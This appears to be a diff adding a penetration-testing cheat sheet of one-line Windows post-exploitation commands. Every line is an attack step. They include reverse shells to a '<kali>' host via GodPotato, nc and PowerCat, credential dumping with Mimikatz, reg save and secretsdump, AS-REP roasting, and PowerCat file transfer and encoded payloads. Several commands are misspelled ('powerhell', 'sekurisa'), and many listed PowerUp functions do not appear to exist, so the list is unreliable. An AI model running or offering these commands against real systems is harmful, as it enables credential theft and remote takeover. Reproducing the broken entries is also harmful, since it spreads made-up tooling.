@@ -1,0 +1,49 @@
+WinPEAS Execution:winpeas.exe | tee <filename>
+WinPEAS PowerShell:winpeas.exe | Tee-Object -FilePath <filename>
+SEImpersonate (SigmaPotato):SigmaPotato.exe --revshell <kali> <kaliPort>
+SEImpersonate (GodPotato):GodPotato.exe -cmd "C:\Temp\nc.exe -t -e C:\Windows\System32\cmd.exe <kali> <kaliPort>"
+SeBackupPrivilege (SAM):reg save hklm\sam <filename>
+SeBackupPrivilege (SYSTEM):reg save hklm\system <filename>
+SeBackupPrivilege (Dump):impacket-secretsdump -sam <filename> -system <filename> LOCAL
+Scheduled Tasks:schtasks /query /fo LIST /v
+PowerShell History:(Get-PSReadlineOption).HistorySavePath
+Mimikatz Dump:mimikatz.exe "privilege::debug" "token::elevate" "sekurisa::logonpasswords" "exit" > <filename>
+Mimikatz SAM Dump:mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > <filename>
+Rubeus AS-REP Roast:Rubeus.exe asreproast /nowrap
+Secretsdump (NTDS):impacket-secretsdump -ntds <filename> -system <filename> LOCAL
+PowerUp Basic Checks:powerhell -ep bypass; . .\PowerUp.ps1; Invoke-AllChecks
+PowerUp Service Checks:powerhell -ep bypass; . .\PowerUp.ps1; Invoke-ServiceAbuse -Name '<file>'
+PowerUp Service Restart:powerhell -ep bypass; . .\PowerUp.ps1; Restore-ServiceBinary -Name '<file>'
+PowerUp DLL Hijack:powerhell -ep bypass; . .\PowerUp.ps1; Find-ProcessDLLHijack
+PowerUp Unquoted Service Paths:powerhell -ep bypass; . .\PowerUp.ps1; Get-UnquotedService
+PowerUp Modifiable Service Binaries:powerhell -ep bypass; . .\PowerUp.ps1; Get-ModifiableService
+PowerUp Modifiable Service Configs:powerhell -ep bypass; . .\PowerUp.ps1; Get-ModifiableServiceFile
+PowerUp Registry Checks:powerhell -ep bypass; . .\PowerUp.ps1; Get-RegistryAlwaysInstallElevated
+PowerUp Writable Paths:powerhell -ep bypass; . .\PowerUp.ps1; Find-PathDLLHijack
+PowerUp Writable Service Binaries:powerhell -ep bypass; . .\PowerUp.ps1; Get-ServiceUnquoted
+PowerUp Privileged Tokens:powerhell -ep bypass; . .\PowerUp.ps1; Invoke-TokenManipulation
+PowerUp GPO Checks:powerhell -ep bypass; . .\PowerUp.ps1; Get-GPOFiles
+PowerUp GPO Local Privilege:powerhell -ep bypass; . .\PowerUp.ps1; Get-GPOLocalGroup
+PowerUp Scheduled Task Checks:powerhell -ep bypass; . .\PowerUp.ps1; Get-ScheduledTaskFile
+PowerUp Modifiable Folders:powerhell -ep bypass; . .\PowerUp.ps1; Get-ModifiablePath
+PowerUp Modifiable Registry Autologon:powerhell -ep bypass; . .\PowerUp.ps1; Get-RegistryAutoLogon
+PowerUp Modifiable Hosts File:powerhell -ep bypass; . .\PowerUp.ps1; Get-ModifiableHostFile
+PowerUp Modifiable Ini Files:powerhell -ep bypass; . .\PowerUp.ps1; Get-ModifiableIniFile
+PowerUp McAfee Exclusions:powerhell -ep bypass; . .\PowerUp.ps1; Get-McAfeeExclusions
+PowerUp LSA Secrets:powerhell -ep bypass; . .\PowerUp.ps1; Get-LsaSecret
+PowerUp Cached Credentials:powerhell -ep bypass; . .\PowerUp.ps1; Get-CachedGPPPassword
+PowerUp Credential Dumper:powerhell -ep bypass; . .\PowerUp.ps1; Invoke-CredentialDumper
+PowerUp PS History:powerhell -ep bypass; . .\PowerUp.ps1; Get-PSSessionHistory
+PowerUp PS Transcript:powerhell -ep bypass; . .\PowerUp.ps1; Get-PSTranscript
+PowerUp WSUS Abuse:powerhell -ep bypass; . .\PowerUp.ps1; Invoke-WsusAbuse
+PowerCat Reverse Shell:powercat -c <target> -p <port> -e cmd
+PowerCat Reverse Shell (SSL):powercat -c <target> -p <port> -e cmd -ssl
+PowerCat Bind Shell:powercat -l -p <port> -e cmd
+PowerCat Bind Shell (SSL):powercat -l -p <port> -e cmd -ssl
+PowerCat File Transfer (Send):powercat -c <target> -p <port> -i <file>
+PowerCat File Transfer (Receive):powercat -l -p <port> -of <file>
+PowerCat Relay:powercat -l -p <port> -r <target>:<port>
+PowerCat Standalone Payload:powercat -c <target> -p <port> -e cmd -g
+PowerCat Encoded Payload:powercat -c <target> -p <port> -e cmd -ge
+PowerCat Local Port Forward:powercat -l -p <port> -r <target>:<port>
+PowerCat Remote Port Forward:powercat -c <target> -p <port> -r <target>:<port>
